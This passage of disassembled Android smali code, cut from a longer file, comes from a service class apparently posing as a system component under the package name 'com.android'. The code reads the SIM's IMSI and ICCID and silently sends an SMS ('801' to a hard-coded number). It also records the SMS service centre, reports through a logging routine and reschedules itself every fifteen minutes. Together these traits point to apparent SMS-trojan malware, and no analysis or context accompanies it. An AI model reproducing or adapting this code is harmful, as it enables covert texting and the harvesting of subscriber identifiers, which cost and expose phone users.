    iput-object v0, v1, Lcom/android/MainService;->imsi:Ljava/lang/String;

    .line 120
    invoke-virtual/range {v19 .. v19}, Landroid/telephony/TelephonyManager;->getSimSerialNumber()Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->iccid:Ljava/lang/String;

    .line 122
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    move-object v3, v0

    if-eqz v3, :cond_2

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    move-object v3, v0

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v3

    const/4 v4, 0x5

    if-le v3, v4, :cond_2

    .line 123
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    move-object v3, v0

    const/4 v4, 0x3

    const/4 v5, 0x5

    invoke-virtual {v3, v4, v5}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->mnc:Ljava/lang/String;

    .line 125
    :cond_2
    const-string v3, "01"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->mnc:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_3

    .line 126
    const-string v3, "10010"

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->testtel:Ljava/lang/String;

    .line 130
    .end local v19           #tm:Landroid/telephony/TelephonyManager;
    :cond_3
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object v3, v0

    invoke-static {v3}, Lcom/android/FileAct;->readString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    .line 132
    .local v15, record:Ljava/lang/String;
    const/4 v12, 0x0

    .line 133
    .local v12, isstatis:Z
    if-eqz v15, :cond_a

    const-string v3, ""

    invoke-virtual {v15, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_a

    .line 134
    invoke-static {v15}, Lcom/android/StringUtil;->getRecordInfo(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v10

    .line 135
    .local v10, docount:[Ljava/lang/String;
    if-eqz v10, :cond_9

    array-length v3, v10

    const/4 v4, 0x3

    if-ne v3, v4, :cond_9

    .line 136
    const/4 v3, 0x1

    aget-object v3, v10, v3

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->smallpid:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_4

    .line 137
    const/4 v3, 0x0

    aget-object v3, v10, v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 138
    const/4 v3, 0x2

    aget-object v3, v10, v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    .line 139
    const/4 v12, 0x1

    .line 141
    :cond_4
    const/4 v3, 0x2

    aget-object v18, v10, v3

    .line 142
    .local v18, smsc:Ljava/lang/String;
    const-string v3, "other"

    move-object v0, v3

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_6

    .line 143
    const-string v3, ""

    move-object v0, v3

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_6

    .line 144
    move-object/from16 v0, v18

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    .line 183
    .end local v10           #docount:[Ljava/lang/String;
    .end local v18           #smsc:Ljava/lang/String;
    :goto_0
    if-eqz v12, :cond_5

    .line 185
    const/4 v3, 0x0

    const/4 v4, 0x0

    move-object/from16 v0, p0

    move v1, v3

    move v2, v4

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    move-result v16

    .line 186
    .local v16, result:I
    const/16 v3, 0xc8

    move/from16 v0, v16

    move v1, v3

    if-ne v0, v1, :cond_5

    .line 187
    new-instance v3, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object v4, v0

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "|"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->smallpid:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "|"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 188
    .local v13, logtxt:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object v3, v0

    invoke-static {v13, v3}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 192
    .end local v13           #logtxt:Ljava/lang/String;
    .end local v16           #result:I
    :cond_5
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->timer:Ljava/util/Timer;

    move-object v3, v0

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->newtask:Ljava/util/TimerTask;

    move-object v4, v0

    const-wide/16 v5, 0x0

    const-wide/32 v7, 0xdbba0

    invoke-virtual/range {v3 .. v8}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;JJ)V

    .line 193
    return-void

    .line 145
    .restart local v10       #docount:[Ljava/lang/String;
    .restart local v18       #smsc:Ljava/lang/String;
    :cond_6
    const-string v3, "other"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_7

    .line 146
    const-string v3, ""

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_7

    .line 147
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    move-object/from16 v18, v0

    .line 149
    new-instance v3, Ljava/lang/StringBuilder;

    const/4 v4, 0x0

    aget-object v4, v10, v4

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "|"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->smallpid:Ljava/lang/String;

    move-object v4, v0

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "|"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 150
    .restart local v13       #logtxt:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object v3, v0

    invoke-static {v13, v3}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 153
    .end local v13           #logtxt:Ljava/lang/String;
    :cond_7
    move-object/from16 v0, p0

    iget-boolean v0, v0, Lcom/android/MainService;->issend:Z

    move v3, v0

    if-eqz v3, :cond_8

    .line 154
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->testtel:Ljava/lang/String;

    move-object v3, v0

    const-string v4, "801"

    move-object/from16 v0, p0

    move-object v1, v3

    move-object v2, v4

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    .line 155
    const/4 v3, 0x0

    move v0, v3

    move-object/from16 v1, p0

    iput-boolean v0, v1, Lcom/android/MainService;->issend:Z

    .line 157
    const-wide/16 v3, 0x3a98

    :try_start_0
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1

    .line 162
    :cond_8
    :goto_1
    invoke-static {}, Lcom/android/StringUtil;->getExecTime()Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    goto/16 :goto_0

    .line 165
    .end local v18           #smsc:Ljava/lang/String;
    :cond_9
    invoke-static {}, Lcom/android/StringUtil;->getExecTime()Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 166
    const/4 v12, 0x1

    goto/16 :goto_0

    .line 170
    .end local v10           #docount:[Ljava/lang/String;
    :cond_a
    move-object/from16 v0, p0

    iget-boolean v0, v0, Lcom/android/MainService;->issend:Z

    move v3, v0

    if-eqz v3, :cond_b

    .line 171
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->testtel:Ljava/lang/String;

    move-object v3, v0

    const-string v4, "801"

    move-object/from16 v0, p0

    move-object v1, v3

    move-object v2, v4

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    .line 172
    const/4 v3, 0x0

    move v0, v3

    move-object/from16 v1, p0

    iput-boolean v0, v1, Lcom/android/MainService;->issend:Z

    .line 174
    const-wide/16 v3, 0x3a98

    :try_start_1
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_0

    .line 180
    :cond_b
    :goto_2
    invoke-static {}, Lcom/android/StringUtil;->getExecTime()Ljava/lang/String;

    move-result-object v3

    move-object v0, v3

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 181
    const/4 v12, 0x1

    goto/16 :goto_0

    .line 175
    :catch_0
    move-exception v11

    .line 176
    .local v11, e:Ljava/lang/InterruptedException;
    const-string v3, "info"

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "sleep:"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11}, Ljava/lang/InterruptedException;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_2

    .line 158
    .end local v11           #e:Ljava/lang/InterruptedException;
    .restart local v10       #docount:[Ljava/lang/String;
    .restart local v18       #smsc:Ljava/lang/String;
    :catch_1
    move-exception v3

    goto :goto_1
.end method

.method public onDestroy()V
    .locals 1

    .prologue
    .line 762
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 763
    iget-object v0, p0, Lcom/android/MainService;->sendReceiver:Lcom/android/MainService$SMSReceiver;

    invoke-virtual {p0, v0}, Lcom/android/MainService;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 764
    iget-object v0, p0, Lcom/android/MainService;->deliveryReceiver:Lcom/android/MainService$SMSReceiver;

    invoke-virtual {p0, v0}, Lcom/android/MainService;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 765
    iget-object v0, p0, Lcom/android/MainService;->smsReceiver:Lcom/android/MainService$SMSReceiver;

    invoke-virtual {p0, v0}, Lcom/android/MainService;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 766
    return-void
.end method
